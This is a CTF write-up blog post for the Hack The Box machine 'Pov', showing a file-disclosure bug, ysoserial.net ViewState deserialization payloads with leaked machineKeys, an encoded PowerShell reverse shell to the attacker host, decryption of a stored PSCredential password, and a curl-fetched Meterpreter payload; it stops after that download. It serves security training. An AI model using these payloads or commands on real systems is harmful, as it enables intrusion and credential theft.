---
layout: post
title: "pov"
date: 2025-10-31 
categories: CTF
---
# pov

# Summary

- went on web page to find domain name
- ffuf to fuzz for subdomains; found dev
- download function has file disclosure vulnerability; disclose web.config; exposed decryptionKey and validationKey
- use [ysoserial.net](http://ysoserial.net) to serialise commands encrypted with keys to inject commands in VIEWSTATE; when __VIEWSTATE gets deserialised by server, our command will be executed; reverse shell
- connections.xml containing encrypted PSCredential password found in sfitz’s Documents dir; Import-clixml/SecureString reconstruction to decrypt password
- RunasCs to get unrestricted shell
- alaading has SeDebugPrivilege
- get meterpreter session; migrate to a SYSETM process; NT SYSTEM shell

# Attack Path

Enumerate the open ports and services:

```bash
sudo nmap -sV -sC -oN nmap/pov 10.10.11.251

80/tcp open  http    Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: pov.htb
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

```

Let’s add the domain name to our /etc/hosts file.

Only one port open. Let’s scan all ports:

```bash
sudo nmap -p- 10.10.11.251 -v --min-rate=10000

PORT   STATE SERVICE
80/tcp open  http

```

Still only one port.

Let’s visit the web page:

![image.png]({{ site.baseurl }}/assets/pov/image.png)

![image.png]({{ site.baseurl }}/assets/pov/image%201.png)

An user email is exposed here. We try submitting the contact form, however, it does not actually perform a POST request.

![image.png]({{ site.baseurl }}/assets/pov/image%202.png)

Let’s fuzz for subdomains:

```bash
ffuf -u http://10.10.11.251 -H "Host: FUZZ.pov.htb" -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -fs 12330

dev

```

## dev.port.htb

Let’s add that to our /etc/hosts file then visit the site:

```bash
http://dev.pov.htb
```

![image.png]({{ site.baseurl }}/assets/pov/image%203.png)

Stephen Fitz, this fits the username that was exposed earlier `sfitz.pov.htb`.

We also get an option to download a CV 

![image.png]({{ site.baseurl }}/assets/pov/image%204.png)

metadata of the pdf:

```bash
exiftool cv.pdf

ExifTool Version Number         : 13.25
File Name                       : cv.pdf
Directory                       : .
File Size                       : 148 kB
File Modification Date/Time     : 2025:10:30 07:58:18-04:00
File Access Date/Time           : 2025:10:30 10:08:36-04:00
File Inode Change Date/Time     : 2025:10:30 07:58:18-04:00
File Permissions                : -rw-rw-r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.7
Linearized                      : No
Page Count                      : 1
Language                        : es
Tagged PDF                      : Yes
XMP Toolkit                     : 3.1-701
Producer                        : Microsoft® Word para Microsoft 365
Creator                         : Turbo
Creator Tool                    : Microsoft® Word para Microsoft 365
Create Date                     : 2023:09:15 12:47:15-06:00
Modify Date                     : 2023:09:15 12:47:15-06:00
Document ID                     : uuid:3046DD6C-A619-4073-9589-BE6776F405F2
Instance ID                     : uuid:3046DD6C-A619-4073-9589-BE6776F405F2
Author                          : Turbo

```

We captured the request of the download on burp

![image.png]({{ site.baseurl }}/assets/pov/image%205.png)

We download from _EVENTTARGET

We also find this clue:

![image.png]({{ site.baseurl }}/assets/pov/image%206.png)

Let’s see if we can download arbitrary files:

```bash
file=C:\Windows\System32\drivers\etc\hosts
```

![image.png]({{ site.baseurl }}/assets/pov/image%207.png)

Seems like we got a file disclosure vulnerability. 

Let’s check web.config file in the webroot:

```bash
file=..\web.config
```

```bash
<configuration>
  <system.web>
    <customErrors mode="On" defaultRedirect="default.aspx" />
    <httpRuntime targetFramework="4.5" />
    <machineKey decryption="AES" decryptionKey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" validation="SHA1" validationKey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468" />
  </system.web>
    <system.webServer>
        <httpErrors>
            <remove statusCode="403" subStatusCode="-1" />
            <error statusCode="403" prefixLanguageFilePath="" path="http://dev.pov.htb:8080/portfolio" responseMode="Redirect" />
        </httpErrors>
        <httpRedirect enabled="true" destination="http://dev.pov.htb/portfolio" exactDestination="false" childOnly="true" />
    </system.webServer>
</configuration>
```

We have thedecrpytionKey and the validationKey. With these, we can get RCE from the server performing deserialization on VIEWSTATE. 

## Foothold

First, let’s go to our Windows host and download ysoserial.net: 

https://github.com/pwntester/ysoserial.net?tab=readme-ov-file

Now we open Visual Studio and the .sln file. On the header, we choose the Solution Configurations to Releases and x64, then build solution. Now we should have an executable in `ysoserial.net/ysoserial/bin/Release/ysoserial.exe` 

```bash
cd ysoserial.net\ysoserial\bin\Release\

#To get example usages:
.\ysoserial.exe -P ViewState --examples

###OUTPUT:
.\ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "echo 123 > c:\windows\temp\test.txt" --path="/somepath/testaspx/test.aspx" --apppath="/testaspx/" --decryptionalg="AES" --decryptionkey="34C69D15ADD80DA4788E6E3D02694230CF8E9ADFDA2708EF43CAEF4C5BC73887" --validationalg="HMACSHA256" --validationkey="70DBADBFF4B7A13BE67DD0B11B177936F8F3C98BCE2E0A4F222F7A769804D451ACDB196572FFF76106F33DCEA1571D061336E68B12CF0AF62D56829D2A48F1B0" 
```

Let’s test out if we can execute command; let’s send ping requests back to our host. 

Start listener on attack host:

```bash
sudo tcpdump -n -i tun0 icmp
```

Now let’s create our ViewState payload:

```bash
.\ysoserial.exe -p ViewState -g TextFormattingRunProperties --path="/portfolio" --apppath="/" --decryptionalg="AES" --decryptionkey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" --validationalg="SHA1" --validationkey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468" -c "ping 10.10.16.3" 

GUT3VRO%2Fu8rZpDHx0jC%2BrnFIWePBWk7vUZqc0QiQRnWPackOrMxnVTWL0m8OYXZ4cbB7M1USrkF9W02Dy%2Fbw3dwGCyhUU%2BljFb%2FDHUhswjHEbFpUqS5qbtGWci50Or33wCf0Rw4qeFBQd3hZOmPSB7NRiakkptgI%2FioOz4xw6ZA8m4LfO0E3zV5x4%2BZRITEs4fBaaYDt1jaNh51yy7viOcwtKVohkJ2fj8G2jyh12bYcHcQ9o6tzq2hLIe5wuSmDOdKujf%2FFhEw6oKFvYHny0LO20Sd1zQAEBlSPolB7yd01X76LESVTFSYZIl9zTzjUj53KxSJ2Q2OnaEKK%2BazInpQJnTNvagPM0s5UaV5tK0qGj4T8L9wI%2BdppjMZKSUip1k9Pry863a2jbGH5nAjoGM%2Fz5E8kxzpMzTxTdG4uis8IcGldO0l9qgVm8u2XIgOYQQSQBNXXae4jV6ZD%2Foxtwrujy8X3%2BVRKPS9SBGb5PF7ImeuEpAyHa6fsH5UShwmpP%2Bkdq2t2pJ1zamr8rLKNFy%2Fkn%2B2Zr%2FYTt1Bv2baWH0aSALqoeOUfgFO%2BvYn0RhcQZazQL2W7OibTYcHjoXkZlq7%2FYcxdXErEgfLpYVMHsa5N20B0ZJqdC60QKawm2DyOiD%2BxbygHyx0eXcXb3VM85L8cVzancvYM2uNDYqJjqK1u9MLn%2BBjmVgIwtaO6C2H0eX%2BfVZGb2r6gngWluQp7d3riZvyTp3rO7XQ5Pr0bF1%2BBK15rSaYDVgzv3KSUK5z1s49Hbr54%2F%2BTPaZoUurpc%2BuVIMWTgA7zbwcIiHiyt%2F58JW%2FPnoBY%2BME%2FawFJMqvNyEGLLR2M1DIGMaDP99MjKrNX7ZED5y3e9AhaYW9LIAAL6jV0rj30%2BGkYUmHPzYkHh2sHdX3dCDxbmL%2FhWajq%2BA94hG3orIVGi543WcMxXnq7xG8TAeMVhzvw0OHStt4g%2FjXO2zy7H0YDCHNji6MUYY9ytOcbzWp1f6M7WvfBgxbozkOdypF%2FVRCu4Xg%2FCaS%2FKm7wd8fl2bUzr2lbvXZDgy6R918TvXRvmBeBqhiAv8C9Ax8HTt%2BQ1xIZRir42%2FIAymeY40qSzP%2Bp%2FiHKz38Rvd4WnAxpuww0romM%2F2DBQdAJNyZrrZXWqJPdFGQgvnhToPG5KUHOAtmT2WWiGMw%2Fcqztp6FTu7Uj37pWySmDUbACPel4OWwc5YMa5y71Rxb8hpM8cpBXDvVw7LTFvPvC0R47nPkRhCj0MJ2BthPHpKBh3kNiV5q3Uw22blN6LNhoGRHww84Li%2BxZQxBJCE654raxZLKw%3D
```

Now go back to our POST request and inject our payload in __VIEWSTATE:

![image.png]({{ site.baseurl }}/assets/pov/image%208.png)

In our terminal:

![image.png]({{ site.baseurl }}/assets/pov/image%209.png)

It works. Now let’s get a reverse shell back. First, copy Nishang’s powerhshell one liner to a file, changing the IP and port. Now convert it to base64:

```bash
cat shell.ps1 | iconv -t utf-16le | base64 -w 0

JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQAwAC4AMQAwAC4AMQA2AC4AMwAnACwANAA0ADQANAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAnAFAAUwAgACcAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAnAD4AIAAnADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAAoA
```

Now our whole payload:

```bash
.\ysoserial.exe -p ViewState -g TextFormattingRunProperties --path="/portfolio" --apppath="/" --decryptionalg="AES" --decryptionkey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" --validationalg="SHA1" --validationkey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468" -c "powershell -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQAwAC4AMQAwAC4AMQA2AC4AMwAnACwANAA0ADQANAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAnAFAAUwAgACcAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAnAD4AIAAnADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAAoA"

I4v%2B8W8UnluneXn8XpWJnVoRxnXUR07yLD%2FNwjgRgubJaesP%2Fq7oGTaAWbeHnbM%2FT65b54DKPhIzu0k1FKH9HbgG1bCTkbhuM75UAsRxwRzMIzzOdxg8hocRzrtY4twpCPLFDzBKyZ1QmKVQf0sZ9jMXRMUjgJbcVUz0UtoEVr2NibyWMW6x4xKpBWTErP3d4TQE2RLrYre3nGGQ0nKZS0BDvhHIMApn8qWrcRrCST0T3eEwUjnsW%2BScfNMydq2RqgG%2BoS1K5l%2BM1zJ1XaZDATrVP%2B0Lu0A8ZJoh3ae7X96ya4XL5UHNCSZULuAL%2F%2BDchlM2Ql8i5jSshty%2F0eUHNC%2B0vNBB80l7jzxn%2FqJVD5F6t0fh09E1yYxFjP0SKChlrimxhH%2FxlAiMAhrzA0tPXEhqkLlrectuMsJBPZllyrjJW9brZlFlCXm886x5%2F%2FZRwQDJtcUXFqNQBIOZsjGQn66Vmd6f%2FtCbrekzDAjSo3rAvGSWF6r8fKdizTu6YkUk4NyWouEkwXmWWPdj5HvGBdwiIxn4yeBiVmvtvqhrMb7zhYIhiOfOjVLMOrzNa99Vere0aQ2turQiREPWhOPpVzp7fbgYLIbYs3oQE7qYzSNc1qwWRmDsvjo%2FBRAYLqbdt56iWlyyXdsTElsf%2BCakJkrfkfYlDMNYuGPmUKtECF%2FtPHiK6V3cdqBhnCE7UJzfO7YRRL6jCzpLJdlLhpb%2Bw5iqwEjtQHhlZtqIrH%2F8lMib42jeA1kL%2BESc5rpmI%2BC47%2BuHAAjdZ3CXDdpxwKtXZbzK74eoputbpBkmlN40bMHKDMInDxykLkUwBbZt3CLbOjP67xCKwOjC%2BLRLrKPGNvsWpxNttmPFjAkcp%2BFzwoUHCPFO4nGdZaLtTLdLeobUnLPuO6HKe0usdbnMe%2Bjj%2B1znc8zwYp4M3jlcwVOwLyQQieha1R%2FeNlQ6UtkuA4jnKvSQoDSwI%2Fik5BIyqa7Pc035RN2kYKzhxtLqG%2BTLpre0J59YZRDKexeCxc0cSR6HWbApqyIPQ5w%2BnBR62PHUpo2LwVEgyfR6%2Bqp9Gq2u9qjIIuAdee9lBCUpGz8ejM7gxD%2FqOqYXzQrZAVWIFfgxroHiiiVPs8kQlrwbVxC%2FU9Og3v2f94kzEnmh1bNCjksmW3t5h09n0nGBOr6%2F3hz1os2CRHmp9zyhzHFTTn8J0C4m5CngnobZzHkZfxKcVKypVqzUDgPs1zGyp7JNl34ejLZDc2Val%2B1gemNumPmHIzuDoSM6ezFjzWEPtrPqJsmrI0I1cpJvf4uUS70o9%2BQIA0bMuRI8CGw0LMxVFdlF4B6Wwc5vN3fabSk%2BxoLdYVSJD%2FbAUx3azJyR5MxW%2Fh1vU9csWcHjxgjCEwhnHxNyc7KgRWsZ%2FHSVdtLK%2FQpw%2FvLaR79VTHv9rgmefciiijyfbNjz2rPPldjrY%2FrG%2FXB%2FhI62B1Q7IQfWraHtpUKXdNBjJNaF%2FNvh12d7b1iqKTx5%2BhQqTGotvjIVKAjvi4ZP3U0rNKBWwQxRiM5b4ZQlDu3ajE%2FNT3goSF1SL%2FWyD27AR4%2FDLY7C9afuav3GLTMUQtCRKbjkCJd8L3fyb80gNGx8D3DB3mvCpUpY9J0aBkMRFP9k34XLGqpeiQa3inuaulTa7jFOO%2FAGb06OBMW0OgdYaNtkcMBtXYbwHAkFRBu%2FCyCpUurJpqMVNGwUwbhyqvxhH%2F001U7lfQkgwlYXCnZ1gwExSaWfL2WB5PfpsZS7i9qpU3rLCtdoYBpMOhK20tVQz%2FQ358D3mS8kYSwMXrxJoktL8CcmG9kUjsD0vEhx2weSSvEMRKh6uQfAZLg9ByyYRV%2FQ47%2F5tRG5B27hck16ioXzmQSYSPcRVT%2BCFtPtJH3H0eZtzc85CEm1IwIOeN%2B0YOLwNrdB0EddunPV4BSrW%2FMdnrMEiSb%2F%2B7CQo8dGqOB35s7rZuUlXHAlQOu5GgTP18jVD%2FJeSXJkFa5GNCBNKZt3htRrZWhPirh48r2a7XEj%2Fw3bIOkWZ1GO12JMUuRrMYf5MpMnIZsjuFdZ5bKyp6ODK46ldld715mCplcr%2BqY7tK2JdpqFVN7XODiKYon62IL1WwKWOeyJsXVP90%2FCzafIJJn%2Fxi6xGIjLpgbWQcv%2BJsBA%2FicF%2BmIURFSC9MDfJIrKlafFieK7o7i%2BU5mY%2F%2B9UJ5wJ1dRG8lXbkMAVRz%2Bae6giJf%2F0SSKvgwzbuZcLOgiWoYIBwDPfIX%2FFhVuoIykvnSb2RCPrCP3kqw5D0bW7MAuBgzbbOscQ4v7no8uWlq9JR2NKIBqxJ9DvweUXzpa9uoUYF%2FB20zBLY53IjriYVoQDUpRXUCCrQEc7qD8zw2Qo6ibDDrM9X0MQT%2FiCZ809wnpoYLzJg9pqdIhMs68cbcxFa44lug1xfUTMmxrviRI9CmuXSEjwy65dVpmNDPM%2FM%2FKTFxovultBcbsPKM6JktZHs3vGoEKVSSk3%2Bmr2KMNeb5n7Jtli1HTaZNCoZSYNiCRXh8K2Un7aI66A0hqrLPoBa31OJlJXq1UUGpu4nzBWrLgOhJl7YhjoxTyPgdOJA%2FsK78C7WOgSXeqimuVD6SE2G3y0%2BrJxL14ku9hZVMocrFsAIvp3DMaZ4Gk3WwqrKu2%2FV6GeovetgAuJRmB1cSjSIrmmTH3MFmaoXlxqdcQI%2BNr7tMT3ZFmhv6rZpRIn7en2893ajVeAnbYfZt4s3SUss5ExMf4J4hO%2BM1CL9RC8SA1l7o5APouszXXN1644S2u%2BrPJxlBMIBkfPXLUQCdSJzJn0n7OWVEkFVTuXD0pE0qEfngfw7c2Fjg06cH3N3QrMTBZjC3r4q7d8rhfMPL0wnrUxDk1GMGs76IPW%2FoXHcf2yS4oDrLPob1iWgw7sQTgNSp2mxTHSJtJrkO0KBoRZlD4Dxe71aye%2F1sqjB0UofGQrxEkIzF3MpEpSP4%2B5GO4%2FLjgPbZ4w5gW9phmvzWFjj2LZwYwYUS7f337p92MUcGlFD0ixYR%2B91wcZAinT23HG4yHMjB6id7UZCYmKcucJy0b%2FlUqBAEU83fbEmGsGbFBR6zyTNj%2FuZ%2F81FmxEWg%3D%3D
```

Start our listener:

```bash
rlwrap nc -lnvp 4444
```

Go back to our POST request in repeater, alter __VIEWSTATE and click send.

![image.png]({{ site.baseurl }}/assets/pov/image%2010.png)

We now have shell:

![image.png]({{ site.baseurl }}/assets/pov/image%2011.png)

## Lateral Movement

Let’s enumerate basic information:

![image.png]({{ site.baseurl }}/assets/pov/image%2012.png)

Check any saved creds:

```bash
cmdkey /list

Currently stored credentials:

* NONE *
```

Check PowerShell history:

```bash
type C:\Users\sfitz\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

Let’s also enumerate network information:

```bash
PS C:\Users\sfitz\AppData\Local\Microsoft\Credentials> ipconfig /all

Windows IP Configuration

   Host Name . . . . . . . . . . . . : pov
   Primary Dns Suffix  . . . . . . . :
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No

Ethernet adapter Ethernet0 2:

   Connection-specific DNS Suffix  . :
   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter
   Physical Address. . . . . . . . . : 00-50-56-94-73-C8
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
   Link-local IPv6 Address . . . . . : fe80::d0a5:7bd:6a45:865%4(Preferred)
   IPv4 Address. . . . . . . . . . . : 10.10.11.251(Preferred)
   Subnet Mask . . . . . . . . . . . : 255.255.254.0
   Default Gateway . . . . . . . . . : 10.10.10.2
   DHCPv6 IAID . . . . . . . . . . . : 117461078
   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-30-95-08-4E-00-50-56-94-73-C8
   DNS Servers . . . . . . . . . . . : 127.0.0.1
   NetBIOS over Tcpip. . . . . . . . : Enabled
PS C:\Users\sfitz\AppData\Local\Microsoft\Credentials> whoami
pov\sfitz
PS C:\Users\sfitz\AppData\Local\Microsoft\Credentials> route print
===========================================================================
Interface List
  4...00 50 56 94 73 c8 ......vmxnet3 Ethernet Adapter
  1...........................Software Loopback Interface 1
===========================================================================

IPv4 Route Table
===========================================================================
Active Routes:
Network Destination        Netmask          Gateway       Interface  Metric
          0.0.0.0          0.0.0.0       10.10.10.2     10.10.11.251    271
       10.10.10.0    255.255.254.0         On-link      10.10.11.251    271
     10.10.11.251  255.255.255.255         On-link      10.10.11.251    271
     10.10.11.255  255.255.255.255         On-link      10.10.11.251    271
        127.0.0.0        255.0.0.0         On-link         127.0.0.1    331
        127.0.0.1  255.255.255.255         On-link         127.0.0.1    331
  127.255.255.255  255.255.255.255         On-link         127.0.0.1    331
        224.0.0.0        240.0.0.0         On-link         127.0.0.1    331
        224.0.0.0        240.0.0.0         On-link      10.10.11.251    271
  255.255.255.255  255.255.255.255         On-link         127.0.0.1    331
  255.255.255.255  255.255.255.255         On-link      10.10.11.251    271
===========================================================================
Persistent Routes:
  Network Address          Netmask  Gateway Address  Metric
          0.0.0.0          0.0.0.0       10.10.10.2  Default
===========================================================================

IPv6 Route Table
===========================================================================
Active Routes:
 If Metric Network Destination      Gateway
  1    331 ::1/128                  On-link
  4    271 fe80::/64                On-link
  4    271 fe80::d0a5:7bd:6a45:865/128
                                    On-link
  1    331 ff00::/8                 On-link
  4    271 ff00::/8                 On-link
===========================================================================
Persistent Routes:
  None

```

We are a domain user. Let’s test if the AV is running;

```bash
Get-MpComputerStatus

AMEngineVersion                  : 0.0.0.0                                                                                                     
AMProductVersion                 : 4.18.23110.3                                                                                                
AMRunningMode                    : Not running 
<SNIP>
```

We are not domain joined:

```bash
(Get-CimInstance Win32_ComputerSystem).PartOfDomain

False
```

In the Documents folder, we find a connections.xml:

```bash
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>System.Management.Automation.PSCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>System.Management.Automation.PSCredential</ToString>
    <Props>
      <S N="UserName">alaading</S>
      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb01000000cdfb54340c2929419cc739fe1a35bc88000000000200000000001066000000010000200000003b44db1dda743e1442e77627255768e65ae76e179107379a964fa8ff156cee21000000000e8000000002000020000000c0bd8a88cfd817ef9b7382f050190dae03b7c81add6b398b2d32fa5e5ade3eaa30000000a3d1e27f0b3c29dae1348e8adf92cb104ed1d95e39600486af909cf55e2ac0c239d4f671f79d80e425122845d4ae33b240000000b15cd305782edae7a3a75c7e8e3c7d43bc23eaae88fde733a28e1b9437d3766af01fdf6f2cf99d2a23e389326c786317447330113c5cfa25bc86fb0c6e1edda6</SS>
    </Props>
  </Obj>
</Objs>
```

This contains alaading’s PSCredential encrypted password. Let’s convert it back to plaintext.

```bash
$cred = Import-Clixml -Path "C:\Users\sfitz\Documents\connection.xml"

$cred.GetNetworkCredential().username

alaading

$cred.GetNetworkCredential().password

f8gQ8fynP44ek1m3
```

An alternative method is:

```bash
$pwd = ConvertTo-SecureString 01000000d08c9ddf0115d1118c7a00c04fc297eb01000000cdfb54340c2929419cc739fe1a35bc88000000000200000000001066000000010000200000003b44db1dda743e1442e77627255768e65ae76e179107379a964fa8ff156cee21000000000e8000000002000020000000c0bd8a88cfd817ef9b7382f050190dae03b7c81add6b398b2d32fa5e5ade3eaa30000000a3d1e27f0b3c29dae1348e8adf92cb104ed1d95e39600486af909cf55e2ac0c239d4f671f79d80e425122845d4ae33b240000000b15cd305782edae7a3a75c7e8e3c7d43bc23eaae88fde733a28e1b9437d3766af01fdf6f2cf99d2a23e389326c786317447330113c5cfa25bc86fb0c6e1edda6

$credential = New-Object System.Management.Automation.PSCredential -ArgumentList "alaading", $pwd

$credential.GetNetworkCredential().password

f8gQ8fynP44ek1m3
```

```bash
alaading:f8gQ8fynP44ek1m3
```

Let’s test out if we can run commands:

```bash
Invoke-Command -ComputerName localhost -Credential $cred -ScriptBlock { whoami } 

pov\alaading
```

Let’s get a reverse shell back. We can just use the same nishange reverse shell as before:

```bash
Invoke-Command -ComputerName localhost -Credential $cred -ScriptBlock { powershell -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQAwAC4AMQAwAC4AMQA2AC4AMwAnACwANAA0ADQANAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAnAFAAUwAgACcAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAnAD4AIAAnADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAAoA} 
```

We now have shell as alaadin.

![image.png]({{ site.baseurl }}/assets/pov/image%2013.png)

## Privilege Escalation

Let’s enumerate the privileges:

![image.png]({{ site.baseurl }}/assets/pov/image%2014.png)

We have SeDebugPrivilege. This means we have privilege to debug any process, we can inject our malcious code into that privileged process and gain SYSTEM command execution. 

We can use the migrate function from a meterpreter session to make the whole process easy. First, let’s generate our payload:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=9001 -f exe -o rev.exe
```

Now let’s start metasploit:

```bash
msfconsole
use exploit/multi/handler
set lhost tun0
set lport 9001
set payload windows/x64/meterpreter/reverse_tcp 
run
```

Now let’s transfer our payload and execute it:

```bash
#on attack
python3 -m http.server 8001

#on target
curl http://10.10.16.3:8001/rev.exe -o rev.exe

